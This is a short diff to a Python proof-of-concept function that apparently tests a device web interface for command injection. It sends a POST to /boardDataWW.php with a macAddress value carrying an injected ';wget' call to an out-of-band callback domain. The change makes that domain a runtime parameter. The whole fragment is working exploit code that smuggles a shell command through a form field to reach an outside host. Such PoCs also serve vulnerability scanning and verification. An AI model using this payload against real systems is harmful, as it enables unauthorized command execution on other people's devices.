@@ -41,7 +41,7 @@ def poc(url):
 
         path = """/boardDataWW.php"""
         method = "POST"
-        data = """macAddress=112233445566%3Bwget+http%3A%2F%2Foob_domain%23&reginfo=0&writeData=Submit"""
+        data = """macAddress=112233445566%3Bwget+http%3A%2F%2F{oob_domain}%23&reginfo=0&writeData=Submit""".format(oob_domain=oob_domain)
         headers = {'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
